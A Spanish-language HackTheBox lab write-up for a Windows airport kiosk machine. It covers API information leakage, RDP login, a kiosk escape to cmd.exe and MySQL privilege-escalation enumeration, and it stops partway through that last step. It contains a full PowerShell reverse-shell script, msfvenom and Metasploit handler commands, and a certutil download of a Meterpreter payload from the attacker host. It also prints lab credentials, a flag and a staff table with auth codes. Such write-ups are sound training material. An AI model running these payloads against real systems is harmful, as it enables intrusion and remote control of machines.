# Touch - Nexion — HackTheBox

> **IP:** `10.129.164.188`
> **Date:** 2026-10-09
> **Difficulty:** Por determinar
> **OS:** Windows (por confirmar versión exacta)

---

## Reconnaissance

### Nmap

El objetivo expone un servicio web en el puerto `8443` y un servicio RDP en el puerto `3389`.

```bash
nmap -sC -sV -p- --min-rate 2000 10.129.11.184 -oN nmap.txt
```

**Servicios identificados hasta el momento:**

| Puerto | Servicio | Observaciones |
|---|---|---|
| `8443/tcp` | HTTPS/HTTP web alternativo | Panel de administración de Nexion DeviceHub |
| `3389/tcp` | `ms-wbt-server` | Remote Desktop Protocol (RDP) |

> Nota: La URL inicial utilizada fue `http://10.129
164.145:8443`, esta automaticamete redirecciona a `/login`

### Web Enumeration

#### 1. Acceso inicial

```text
http://10.129.11.184:8443
```

El servicio redirige automáticamente a `/login`, donde solicita la contraseña del dispositivo.

#### 2. Enumeración de endpoints

Se utilizó Feroxbuster para descubrir rutas bajo `/api/`.

```bash
feroxbuster \
  -u http://10.129.11.184:8443/api/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x json,txt,php,aspx
```

**Resultados relevantes:**

| Código HTTP | Endpoint | Interpretación |
|---|---|---|
| `403` | `/api` | Acceso denegado al directorio |
| `200` | `/api/status` | Endpoint accesible sin autenticación |
| `405` | `/api/scan` | El método HTTP utilizado no está permitido |

El endpoint `/api/status` permite consultar información del dispositivo sin autenticación.

```http
GET /api/status
```

Respuesta:

```json
{
  "device": "Nexion DeviceHub DH-100",
  "serial": "NX-DH-2024-B7042",
  "firmware": "1.4.2",
  "status": "online",
  "uptime": 54853
}
```

#### 3. Descubrimiento de credenciales

El número de serie devuelto por la API proporcionó una pista para la contraseña solicitada en el inicio de sesión.

**Hallazgo:** el valor del campo `serial` coincide con la contraseña del dispositivo.

La contraseña se introdujo en el formulario de acceso y permitió entrar al dashboard.

**Impacto:** una API pública expone información que facilita la autenticación en el panel de administración. Esto constituye una debilidad de divulgación de información y, en este caso, permite el acceso inicial al dashboard.

---

## Foothold

### Vector

Uso de información expuesta por `/api/status` para autenticarse en el panel web, seguido de la interacción con el dispositivo Passport Scanner desde el dashboard.

### Enumeración del dashboard

Después de autenticarse, se identificaron los siguientes dispositivos:

**Passport Scanner — Nexion DocReader SR-4200**

| Propiedad | Valor |
|---|---|
| Serial | `NX-SR-2024-0042` |
| Firmware | `4.2.1` |
| Connection | USB 3.0 |
| Status | Online |
| Username | `KioskUser` |
| Password | `K!0sk2026#` |

**Boarding Pass Printer — Nexion TP-820**

| Propiedad | Valor |
|---|---|
| Serial | `NX-TP-2024-0042` |
| Firmware | `2.8.3` |
| Connection | USB 2.0 |
| Status | Online |
| Username | `KioskUser` |
| Password | `K!0sk2026#` |

Las credenciales expuestas en el dashboard son relevantes para el acceso al sistema. Todavía debe documentarse si se reutilizan directamente para iniciar sesión por RDP o si el acceso se consigue exclusivamente mediante el procedimiento descrito a continuación.

### Explotación del entorno RDP

Se observó que el puerto `3389/tcp` estaba abierto.

usamos un cliente RDP en linux en este caso `xfreerdp`

Con las credenciales encontradas en la web abrimos la conexion
```
xfreerdp /v:10.129.164.178 /u:KioskUser /p:'K!0sk2026#'

# o

xfreerdp3 /v:10.129.164.178 /u:KioskUser /p:'K!0sk2026#'
```

Exploracion

1. Al momento de acceder al escritorio remoto no podemos ver mucho, solo podemos ver paneles de verificacion para que el staff scanee su credencial o para poder verificar que un viajero tenga reservado su pase, nada interesante a simple vista parece un callejon sin salida
2. Durante la interacción con el dashboard, se apagó el dispositivo Passport Scanner. Esta acción provocó un error en el cliente RDP que expuso una interfaz de navegador integrado o un diálogo de archivos.
3. Explicacion del Error

```
Nexion DocReader SR-4200 - Error
Nexion DocReader SR-4200 has stopped responding.
Error Code: SCN-ERR-4092
Device: NX-SR-2024-0042
Contact your system administrator or visit the support page for troubleshooting steps.
https://support.nexionsystems.com/docreader/troubleshoot
```

La secuencia que seguimos para hacer que falle deliberadamente es

```
1. Dashboard web
- Apagas el Nexion DocReader SR-4200.

2. Error SCN-ERR-4092
- La aplicación del dispositivo deja de responder o muestra un error.

3. Interfaz de diálogo o navegador
- Según tu observación, aparece una interfaz desde la que puedes abrir un explorador de archivos.

4. Posible escape del kiosco
- Intentas acceder a cmd.exe desde el diálogo de archivos.
```

### Escape del modo quiosco mediante un error del escáner

El dispositivo Nexion DocReader SR-4200 mostró el siguiente error tras ser apagado desde el panel de control web:

```text
Nexion DocReader SR-4200 has stopped responding.
Error Code: SCN-ERR-4092
Device: NX-SR-2024-0042
```

El error parecía estar relacionado con la falta de respuesta de la aplicación del escáner. Durante la sesión RDP, este evento dejó al descubierto una interfaz adicional que permitía interactuar con un cuadro de diálogo de selección de archivos.

Al presionar `Ctrl + O`, se habilitó el acceso a un explorador de archivos. Esto ofrecía una posible vía de escape del entorno restringido del quiosco. Desde dicha interfaz se intentó abrir el explorador de archivos mediante:

```text
Ctrl + O
```

A continuación, se utilizó dicha interfaz para navegar hasta `C:\Windows\System32` y localizar `cmd.exe`:

```text
C:\Windows\System32
```

Se localizó `cmd.exe` y se intentó abrirlo desde el diálogo.

**Resultado:** se obtuvo acceso a una consola de comandos en el contexto del usuario del entorno kiosco.


**Impacto en la seguridad:** el flujo de gestión de errores parecía exponer funcionalidades que iban más allá de la interfaz prevista para el quiosco, lo que potencialmente permitía el acceso a aplicaciones del sistema operativo.

**Nota:** La causa raíz exacta del error `SCN-ERR-4092` no ha sido verificada de forma independiente. El hallazgo de seguridad se basa en el comportamiento observado durante la sesión RDP, y no en el código de error en sí mismo.

### Acceso con Meterpreter

Se preparó un listener en Metasploit para recibir una conexión inversa desde la máquina objetivo.

**Listener:**

```bash
msfconsole -q
```

Dentro de Metasploit:

```text
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.17.50
set LPORT 9001
run
```
## Payload - Carga Util

Hay dos tipos de “payload” (carga útil):
1. Payload normal

Es un script de PowerShell o un nc.exe
Solo envía texto (comandos y respuestas)
Para recibirlo usas: nc -lvnp 9001
Es una shell básica

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.17.50",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

2. Payload Meterpreter

Es un payload especial de Metasploit
Tiene muchas más funciones (subir/bajar archivos, capturar pantalla, pivoting, etc.)
No funciona con nc
Necesita el listener especial de Metasploit (multi/handler)

Se generó el ejecutable correspondiente desde la máquina atacante:

```bash
msfvenom \
  -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.17.50 \
  LPORT=9001 \
  -f exe \
  -o meterpreter.exe
```

> Este comando genera un archivo `.exe`
> file meterpreter.exe
> meterpreter.exe: PE32+ executable for MS Windows 4.00 (GUI), x86-64, 5 sections

El archivo se preparó para su subida y su ejecución en el objetivo, utilizando.

```
certutil -urlcache -split -f http://10.10.17.50:80/meterpreter.exe C:\Users\Public\shell.exe
```

Con el script anterior se guarda el .exe en `C:\Users\Public\shell.exe` y basata con ejecutarlo para que podamos tener acceso
- Confirmación de la sesión recibida por Metasploit.
La sesion es un hecho ejecutamos `whoami`

```
kiosk-042\kioskuser
```
- Resultado de `getuid` y `sysinfo`.

---

## User Flag

La flag se encontró en el escritorio del usuario del sistema.

```text
user.txt:
5283c5660402f697d5ebce96c5ed357e
```

**Estado:** obtenida.

---

## Privilege Escalation

### Vector identificado: MySQL UDF hacia SYSTEM

El camino de escalada terminó apoyándose en una función definida por el usuario (UDF) de MySQL. La investigación comenzó con WinPEAS, que señaló permisos de escritura excesivos en directorios de MySQL. Después se comprobó que el servicio se ejecutaba como `LocalSystem`, se localizaron credenciales de la base de datos en archivos de la aplicación y se identificó una contraseña de `root` de MySQL en un script de mantenimiento.

La cadena de hallazgos fue:

1. Enumerar el servicio `MySQL80` y sus permisos.
2. Confirmar que el servicio se ejecuta como `LocalSystem`.
3. Revisar la aplicación del kiosco y localizar sus credenciales de base de datos.
4. Examinar los scripts de mantenimiento y recuperar las credenciales de `root` de MySQL.
5. Confirmar que el directorio de plugins es escribible y que MySQL utiliza esa ruta.
6. Registrar y ejecutar una UDF para comprobar la ejecución como `SYSTEM`.
7. Lanzar una shell con privilegios elevados y recuperar `root.txt`.

### 1. Enumeración con WinPEAS

### 1. Enumeración con WinPEAS

Se transfirió `WinPEAS.exe` al objetivo y se ejecutó para recopilar información sobre la configuración del sistema y los posibles vectores de escalada.

```cmd
winPEAS.exe > C:\Users\Public\winpeas.txt
```

Después, se descargó el archivo generado y se analizaron los resultados desde la máquina atacante.

Entre los hallazgos se encontró:

```text
Interesting Services -non Microsoft- (T1007)

MySQL80
Oracle Corporation - MySQL 8.0
C:\MySQL\bin\mysqld.exe --defaults-file=C:\MySQL\my.ini MySQL80

Auto - Running
No quotes and Space detected

File Permissions:
Authenticated Users [Allow: WriteData/CreateFiles]

Possible DLL Hijacking in binary folder:
C:\MySQL\bin
Authenticated Users [Allow: WriteData/CreateFiles]
```

El servicio `MySQL80` está configurado para ejecutarse automáticamente y se encuentra en estado activo.

WinPEAS también identifica permisos de escritura para el grupo `Authenticated Users` en el directorio del ejecutable.

**Interpretación:** un usuario autenticado puede crear archivos dentro de un directorio de la instalación de MySQL. Si el servicio carga un archivo controlable por el usuario y se cumplen las condiciones necesarias, esto podría permitir la ejecución de código con los privilegios del servicio.

Sin embargo, el permiso de escritura por sí solo no demuestra que exista una vía de escalada funcional.

### 2. Verificación de permisos

Se inspeccionaron los permisos del directorio binario:

```cmd
icacls "C:\MySQL\bin"
```

Resultado:

```text
C:\MySQL\bin BUILTIN\Administrators:(I)(OI)(CI)(F)
             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
             BUILTIN\Users:(I)(OI)(CI)(RX)
             NT AUTHORITY\Authenticated Users:(I)(M)
             NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
```

El grupo `Authenticated Users` dispone del permiso `(M)`, que corresponde a `Modify`, además de entradas heredables aplicables a archivos y subdirectorios.

También se inspeccionó el directorio de plugins de MySQL:

```cmd
icacls "C:\MySQL\lib\plugin"
```

Resultado:

```text
C:\MySQL\lib\plugin BUILTIN\Administrators:(I)(OI)(CI)(F)
                    NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                    BUILTIN\Users:(I)(OI)(CI)(RX)
                    NT AUTHORITY\Authenticated Users:(I)(M)
                    NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
```

El directorio de plugins presenta una configuración similar: `Authenticated Users` también tiene permisos de modificación.

**Hallazgo relevante:** tanto `C:\MySQL\bin` como `C:\MySQL\lib\plugin` presentan permisos de escritura excesivos para usuarios autenticados.

### 3. Enumeración del directorio de plugins

Se inspeccionó su contenido:

```cmd
dir "C:\MySQL\lib\plugin"
```

Entre los archivos encontrados figuran:

```text
authentication_kerberos_client.dll
authentication_ldap_sasl_client.dll
component_keyring_file.dll
component_validate_password.dll
connection_control.dll
group_replication.dll
keyring_file.dll
keyring_udf.dll
mysql_clone.dll
mysql_no_login.dll
validate_password.dll
```

El directorio contiene múltiples bibliotecas DLL asociadas con funcionalidades de MySQL.

**Interpretación:** poder escribir en este directorio es una pista importante, pero no significa que MySQL cargue automáticamente cualquier DLL depositada allí. Es necesario determinar qué bibliotecas carga el servicio, cómo resuelve sus rutas y qué mecanismo permite activar esa carga con los privilegios del servicio.

### 4. Análisis de la configuración de MySQL

Se consultó el archivo de configuración:

```cmd
type C:\MySQL\my.ini
```

Contenido relevante:

```ini
[mysqld]
basedir=C:/MySQL
datadir=C:/MySQL/data
port=3306
bind-address=127.0.0.1
max_allowed_packet=256M
innodb_buffer_pool_size=512M
default-authentication-plugin=mysql_native_password
character-set-server=utf8mb4
collation-server=utf8mb4_unicode_ci
log-error=C:/MySQL/data/mysql-error.log
explicit_defaults_for_timestamp=1

[client]
port=3306
default-character-set=utf8mb4
```

La configuración de `my.ini` indica que:

- MySQL utiliza `C:\MySQL` como directorio base.
- Los datos se almacenan en `C:\MySQL\data`.
- El servicio escucha en el puerto `3306`.
- La dirección de escucha está limitada a `127.0.0.1`.

La directiva `bind-address=127.0.0.1` indica que MySQL escucha en la interfaz de loopback y no está configurado para aceptar conexiones TCP desde otras interfaces. Los procesos locales sí pueden conectarse al servicio.

### 5. Validaciones pendientes

Antes de confirmar el vector de escalada, se verificaron la cuenta del servicio, el estado de ejecución y los privilegios del usuario actual.

**Identidad y privilegios del servicio**

- `sc qc MySQL80`: permitió confirmar que el servicio `MySQL80` se ejecuta como `LocalSystem`.

```cmd
sc qc MySQL80
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: MySQL80
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\MySQL\bin\mysqld.exe --defaults-file=C:\MySQL\my.ini MySQL80
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : MySQL 8.0
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```
- `sc queryex MySQL80`: permitió confirmar que el servicio está en ejecución y obtener su PID. Los permisos del directorio de plugins se habían comprobado previamente con `icacls`.

```
sc queryex MySQL80

SERVICE_NAME: MySQL80
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 2540
        FLAGS              :
```

- `whoami` y `whoami /priv`: confirmaron que la sesión actual corresponde a `kioskuser`, con privilegios limitados.

```
whoami
kiosk-042\kioskuser

C:\Users\KioskUser\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```


- Intento de acceder a la DB

```
mysql -u root -e "SELECT user,host,authentication_string FROM mysql.user;"

# mysql -u root -e "SELECT user,host,authentication_string FROM mysql.user;"
# Access is denied.
```

> El usuario `root` de MySQL no era accesible sin credenciales; por eso se continuó buscando la configuración utilizada por las aplicaciones locales.

### 6. Acceso a la DB

La aplicación web o alguno de los servicios locales podía contener las credenciales de MySQL en un archivo de configuración. Se inició la búsqueda de archivos relacionados con la configuración, la conexión y la base de datos.

#### 1. Buscar archivos de configuración comunes
- `dir /s /b C:\*config*.json`: La salida muestra una gran cantida de archivos, pero solo se muestra los mas importante
```
dir /s /b C:\*config*.json
C:\Program Files\HTB Airways\Kiosk\tsconfig.base.json
C:\Program Files\HTB Airways\Kiosk\node_modules\*
C:\Program Files\HTB Airways\Kiosk\packages\backend\tsconfig.json
C:\Program Files\HTB Airways\Kiosk\packages\frontend\tsconfig.json
C:\Program Files\HTB Airways\Kiosk\packages\shared\tsconfig.json
C:\Program Files\Nexion Systems\DocReader\publish\NexionDocReader.runtimeconfig.json
C:\Program Files\Nexion Systems\Printer\publish\NexionPrinter.runtimeconfig.json
C:\ProgramData\Microsoft\Windows\*
```

> Esta búsqueda permitió identificar dos componentes relevantes:
> - `HTB Airways\Kiosk`: aplicación del kiosco y portal web.
> - `Nexion Systems`: aplicaciones asociadas al escáner y la impresora.


- `dir /s /b C:\Program Files\HTB Airways\*.env` : sin salida
- `dir /s /b C:\*connection*`:  Muchoas archivos, pero nada interesante
- `dir /s /b C:\*database*`: Nada interesante

#### 2. Revisar la aplicación Node.js (puerto 3001)

- `tasklist | findstr node`

```
tasklist | findstr node
node.exe                      4256 Services                   0        820 K
node.exe                      3144 Services                   0      1,016 K
node.exe                      5836 Services                   0      6,408 K
```


#### 3. Buscar referencias a MySQL y contraseñas dentro de las aplicaciones

La aplicación `Kiosk` está organizada como un monorepo. Como contiene un paquete `backend`, ese directorio era un lugar razonable para buscar la configuración de la base de datos.

- Directory of `C:\Program Files\HTB Airways\Kiosk\packages\backend`

```
04/04/2026  09:00 PM    <DIR>          .
04/04/2026  07:19 AM    <DIR>          ..
04/04/2026  11:58 PM               647 package.json
04/04/2026  11:58 PM    <DIR>          src
04/04/2026  06:15 AM               141 tsconfig.json
               2 File(s)            788 bytes
               3 Dir(s)   8,476,950,528 bytes free
```

- Directory of `C:\Program Files\HTB Airways\Kiosk\packages\backend\src`

```
04/04/2026  11:58 PM    <DIR>          .
04/04/2026  09:00 PM    <DIR>          ..
04/04/2026  06:46 AM    <DIR>          config
04/04/2026  07:35 PM    <DIR>          data
04/04/2026  03:20 PM    <DIR>          database
09/25/2026  04:08 PM             2,729 index.ts
04/04/2026  06:38 PM    <DIR>          integrations
04/04/2026  06:46 AM    <DIR>          middleware
04/04/2026  10:37 PM    <DIR>          routes
04/04/2026  05:38 PM    <DIR>          schemas
04/04/2026  07:35 PM    <DIR>          services
               1 File(s)          2,729 bytes
              10 Dir(s)   8,476,938,240 bytes free
```

> Dentro de database existe un solo archivo `index.ts`

```ts
import mysql from "mysql2/promise";
import fs from "fs";
import path from "path";

const DB_CONFIG_PATH = process.env.DB_CONFIG_PATH || "C:\\ProgramData\\HTB Airways\\db-config.ini";

function loadConfig(): { host: string; port: number; user: string; password: string; database: string } {
  const defaults = { host: "127.0.0.1", port: 3306, user: "kiosk_app", password: "K!0sk_R3pl1ca#DB", database: "htb_airways" };
  try {
    const ini = fs.readFileSync(DB_CONFIG_PATH, "utf8");
    const get = (key: string) => {
      const m = ini.match(new RegExp(`^${key}\\s*=\\s*(.+)$`, "m"));
      return m ? m[1].trim() : undefined;
    };
    return {
      host: get("host") || defaults.host,
      port: parseInt(get("port") || String(defaults.port), 10),
      user: get("user") || defaults.user,
      password: get("password") || defaults.password,
      database: get("database") || defaults.database,
    };
  } catch {
    return defaults;
  }
}

let pool: mysql.Pool;

export function getDb(): mysql.Pool {
  if (!pool) {
    const cfg = loadConfig();
    pool = mysql.createPool({
      host: cfg.host,
      port: cfg.port,
      user: cfg.user,
      password: cfg.password,
      database: cfg.database,
      waitForConnections: true,
      connectionLimit: 10,
      queueLimit: 0,
    });
    console.log(`MySQL pool created: ${cfg.user}@${cfg.host}:${cfg.port}/${cfg.database}`);
  }
  return pool;
}

export async function checkConnection(): Promise<boolean> {
  try {
    const conn = await getDb().getConnection();
    await conn.ping();
    conn.release();
    return true;
  } catch {
    return false;
  }
}

export function logCheckinAction(pnr: string, passengerId: string, action: string, details?: string) {
  getDb().execute(
    "INSERT INTO checkin_log (pnr, passenger_id, action, details) VALUES (?, ?, ?, ?)",
    [pnr, passengerId, action, details || null]
  ).catch(() => {});
}

export function saveSeatAssignment(passengerId: string, segmentId: string, seat: string, seatClass: string) {
  getDb().execute(
    "INSERT INTO seat_assignments (passenger_id, segment_id, seat_number, seat_class) VALUES (?, ?, ?, ?) ON DUPLICATE KEY UPDATE seat_number = VALUES(seat_number), seat_class = VALUES(seat_class)",
    [passengerId, segmentId, seat, seatClass]
  ).catch(() => {});
}

export function saveBoardingPass(passengerId: string, segmentId: string, pnr: string, seat: string, gate: string, boardingTime: string, barcodeData: string) {
  getDb().execute(
    "INSERT INTO boarding_passes (passenger_id, segment_id, pnr, seat_number, gate, boarding_time, barcode_data) VALUES (?, ?, ?, ?, ?, ?, ?)",
    [passengerId, segmentId, pnr, seat, gate, boardingTime, barcodeData]
  ).catch(() => {});
}
```

> Se encontraron los parámetros de conexión predeterminados de la base de datos:
> - host: "127.0.0.1"
> - port: 3306
> - user: "kiosk_app"
> - password: "K!0sk_R3pl1ca#DB"
> - database: "htb_airways"

> La conexión con el usuario `kiosk_app` fue exitosa. El comando registrado en las notas utiliza `SHOW DATABASE`; para enumerar las bases de datos de MySQL, el comando correcto es `SHOW DATABASES;`.

- Listamos todas las tablas `mysql -u kiosk_app -p"K!0sk_R3pl1ca#DB" -h 127.0.0.1 -e "USE htb_airways; SHOW TABLES;"`

```
mysql: [Warning] Using a password on the command line interface can be insecure.
Tables_in_htb_airways
_htb_staff
_sync_metadata
boarding_passes
booking_passengers
bookings
checkin_log
document_scans
flights
passengers
seat_assignments
```

- Listamos todos los  staff `mysql -u kiosk_app -pK!0sk_R3pl1ca#DB -h 127.0.0.1 -P 3306 htb_airways -e "SELECT * FROM _htb_staff;"`

| ID | Employee ID | Nombre              | Rol                          | Departamento                  | Badge       | Auth Code        | Airport |
|----|-------------|---------------------|------------------------------|-------------------------------|-------------|------------------|---------|
| 1  | HTB-97248   | Marcus Mitchell     | Cargo Supervisor             | Safety & Compliance           | BDG-161430  | 4601947A40E4BDCE | ORD     |
| 2  | HTB-80469   | Elena Kovacs        | First Officer                | Flight Operations             | BDG-545523  | D4E96DB85AECAFC4 | SFO     |
| 3  | HTB-98398   | David Andersen      | Senior Check-in Agent        | Engineering & Maintenance     | BDG-398063  | 255160EA80AF52CC | HKG     |
| 4  | HTB-25469   | Sarah Nakamura      | First Officer                | Revenue Management            | BDG-420823  | 65BBA59D1B5145E7 | HKG     |
| 5  | HTB-76155   | James Okonkwo       | Maintenance Technician       | Terminal Operations           | BDG-457691  | EA42FAB8CAE50D63 | CDG     |
| 6  | HTB-38997   | Priya Bergström     | Check-in Agent               | Security                      | BDG-814602  | D531E04C42758846 | LAX     |
| 7  | HTB-66373   | Thomas Santos       | Aviation Security Lead       | Training & Development        | BDG-807343  | DBEA8BF35F3B93A3 | HKG     |
| 8  | HTB-58295   | Mei Patel           | Customer Service Agent       | Engineering & Maintenance     | BDG-677885  | E624511D7FD0A720 | CDG     |
| 9  | HTB-98600   | Carlos Dubois       | Duty Manager                 | In-Flight Services            | BDG-109474  | 88123126BC55AC23 | JFK     |
| 10 | HTB-34325   | Fatima Kim          | Gate Agent                   | Catering Services             | BDG-723165  | 60F90262004EF01F | CDG     |
| 13 | HTB-15827   | William Ivanova     | Operations Manager           | Training & Development        | BDG-209987  | 43F718B0397FFDF5 | ATL     |
| 14 | HTB-54598   | Yuki Yamamoto       | Operations Manager           | Crew Management               | BDG-779206  | BFDD344882B28674 | LAX     |
| 25 | HTB-31181   | Andre Ibrahim       | Station Manager              | Customer Experience           | BDG-127811  | B678BB6055ACE81F | CDG     |
| 32 | HTB-58288   | Ingrid Silva        | Station Manager              | Ground Services               | BDG-880903  | B95FB54E61B9B4AC | JFK     |

Los registros incluyen roles de mayor responsabilidad, como managers, supervisors y security lead. Se consideraron relevantes para investigar la lógica de autenticación del kiosco; no obstante, los datos por sí solos no demuestran que sus códigos permitan autenticarse.

```
id	employee_id	first_name	last_name	email	auth_code	role	department	badge_number	base_airport	hire_date	phone_ext	active	last_login	notes
32	HTB-58288	Ingrid	Silva	isilva@htbairways.htb	B95FB54E61B9B4AC	Station Manager	Ground Services	BDG-880903	JFK	2020-04-28	2836	1	2026-04-02 08:27:00	NULL
31	HTB-37522	Daniel	Eriksson	deriksson@htbairways.htb	644D5E009C35E316	Safety Officer	Catering Services	BDG-131329	CDG	2021-04-21	4652	1	2026-04-04 20:12:00	NULL
30	HTB-98705	Eva	Hassan	ehassan@htbairways.htb	F83329B17B0C0E83	Customer Service Agent	Revenue Management	BDG-310986	ORD	2021-01-06	2383	1	NULL	NULL
29	HTB-35391	Luis	Suzuki	lsuzuki@htbairways.htb	7DD9286F5DC8B104	Ticketing Agent	Customer Experience	BDG-696932	ATL	2014-06-10	8722	1	2026-04-01 05:11:00	NULL
28	HTB-23411	Amara	Martinez	amartinez@htbairways.htb	B53951FF8C7B63CE	Lounge Manager	Revenue Management	BDG-760222	NRT	2023-07-20	2974	1	2026-04-01 13:08:00	NULL
27	HTB-15335	Kenji	Weber	kweber@htbairways.htb	E5AEFED3F2EEA35F	First Officer	Cargo Operations	BDG-933105	AMS	2015-04-05	6144	1	2026-04-04 05:31:00	NULL
26	HTB-18972	Sophie	Nielsen	snielsen@htbairways.htb	A172D8EA101681AE	Check-in Supervisor	Ground Services	BDG-362969	ATL	2019-06-20	2190	1	2026-04-02 16:10:00	NULL
25	HTB-31181	Andre	Ibrahim	aibrahim@htbairways.htb	B678BB6055ACE81F	Station Manager	Customer Experience	BDG-127811	CDG	2018-12-11	5643	1	2026-04-04 05:52:00	NULL
24	HTB-97223	Leila	Tanaka	ltanaka@htbairways.htb	6348DC443E0883A9	Line Maintenance Supervisor	Flight Operations	BDG-340077	SFO	2013-08-02	3149	1	2026-04-02 06:37:00	NULL
23	HTB-21796	Benjamin	Gonzalez	bgonzalez@htbairways.htb	65D6F6CED43D3C2E	Line Maintenance Supervisor	Customer Experience	BDG-149939	MIA	2011-11-11	7795	1	2026-04-02 11:54:00	NULL
22	HTB-34190	Chloe	Petrov	cpetrov@htbairways.htb	9C70CBAA6540797E	Terminal Coordinator	In-Flight Services	BDG-447498	CDG	2014-01-02	9265	1	2026-04-01 16:07:00	NULL
21	HTB-58317	Michael	McAllister	mmcallister@htbairways.htb	A653E3DEECCBDBCE	Customer Service Agent	Terminal Operations	BDG-274006	SFO	2009-04-09	7257	1	NULL	NULL
20	HTB-11937	Zara	Chen	zchen@htbairways.htb	7BF959E12104A59B	Flight Engineer	Engineering & Maintenance	BDG-618772	LAX	2025-01-06	4076	1	2026-04-03 10:21:00	NULL
19	HTB-12142	Patrick	Johansson	pjohansson@htbairways.htb	CC1C6384C79F8486	Safety Officer	Ground Services	BDG-792958	NRT	2025-02-16	8415	1	NULL	NULL
18	HTB-73230	Nina	Fernandez	nfernandez@htbairways.htb	48E3CA097528E009	Ticketing Agent	Security	BDG-324086	LAX	2015-06-01	4177	1	2026-04-02 05:28:00	NULL
17	HTB-89426	Sergei	Müller	smller@htbairways.htb	DFD0F7A09BFC9351	Baggage Handler	Terminal Operations	BDG-571942	LAX	2011-05-23	6866	1	2026-04-03 12:23:00	NULL
16	HTB-24441	Olivia	Lindberg	olindberg@htbairways.htb	1871D8DE90E9135B	Check-in Supervisor	Cargo Operations	BDG-491066	CDG	2013-06-23	8310	1	2026-04-04 22:32:00	NULL
15	HTB-75142	Ahmed	Al-Rashid	aalrashid@htbairways.htb	B0E5D6C0675DC6DC	Security Screening Officer	Security	BDG-571717	SIN	2020-01-11	7962	1	NULL	NULL
14	HTB-54598	Yuki	Yamamoto	yyamamoto@htbairways.htb	BFDD344882B28674	Operations Manager	Crew Management	BDG-779206	LAX	2014-09-01	8768	1	2026-04-04 15:50:00	NULL
13	HTB-15827	William	Ivanova	wivanova@htbairways.htb	43F718B0397FFDF5	Operations Manager	Training & Development	BDG-209987	ATL	2023-12-06	8588	1	2026-04-03 11:55:00	NULL
12	HTB-45332	Anika	Torres	atorres@htbairways.htb	5E029161F6ECE1A9	Quality Assurance Inspector	Terminal Operations	BDG-663485	SIN	2016-07-08	1220	1	2026-04-02 07:10:00	NULL
11	HTB-43955	Robert	Hoffmann	rhoffmann@htbairways.htb	AD59D674FEE120D4	Revenue Management Analyst	Crew Management	BDG-338886	ATL	2023-02-02	6137	1	2026-04-04 19:26:00	NULL
10	HTB-34325	Fatima	Kim	fkim@htbairways.htb	60F90262004EF01F	Gate Agent	Catering Services	BDG-723165	CDG	2009-01-02	7232	1	2026-04-01 16:10:00	NULL
9	HTB-98600	Carlos	Dubois	cdubois@htbairways.htb	88123126BC55AC23	Duty Manager	In-Flight Services	BDG-109474	JFK	2020-10-20	3525	1	2026-04-02 18:27:00	NULL
8	HTB-58295	Mei	Patel	mpatel@htbairways.htb	E624511D7FD0A720	Customer Service Agent	Engineering & Maintenance	BDG-677885	CDG	2016-09-26	2003	1	2026-04-02 09:58:00	NULL
7	HTB-66373	Thomas	Santos	tsantos@htbairways.htb	DBEA8BF35F3B93A3	Aviation Security Lead	Training & Development	BDG-807343	HKG	2020-09-22	7355	1	2026-04-02 06:33:00	NULL
6	HTB-38997	Priya	Bergström	pbergstrm@htbairways.htb	D531E04C42758846	Check-in Agent	Security	BDG-814602	LAX	2020-12-13	9830	1	2026-04-04 16:41:00	NULL
5	HTB-76155	James	Okonkwo	jokonkwo@htbairways.htb	EA42FAB8CAE50D63	Maintenance Technician	Terminal Operations	BDG-457691	CDG	2016-05-23	1023	1	NULL	NULL
4	HTB-25469	Sarah	Nakamura	snakamura@htbairways.htb	65BBA59D1B5145E7	First Officer	Revenue Management	BDG-420823	HKG	2009-05-28	8268	1	2026-04-02 21:16:00	NULL
3	HTB-98398	David	Andersen	dandersen@htbairways.htb	255160EA80AF52CC	Senior Check-in Agent	Engineering & Maintenance	BDG-398063	HKG	2010-08-27	6730	12026-04-02 12:51:00	NULL
2	HTB-80469	Elena	Kovacs	ekovacs@htbairways.htb	D4E96DB85AECAFC4	First Officer	Flight Operations	BDG-545523	SFO	2024-09-25	8444	1	2026-04-03 17:47:00	NULL
1	HTB-97248	Marcus	Mitchell	mmitchell@htbairways.htb	4601947A40E4BDCE	Cargo Supervisor	Safety & Compliance	BDG-161430	ORD	2014-12-25	4601	1	2026-04-04 22:42:06	NULL
```

La tabla `_htb_staff` parecía más una fuente de información para la aplicación que una vía directa de escalada. Por ello, se continuó buscando una contraseña de `root` de MySQL en los scripts locales.

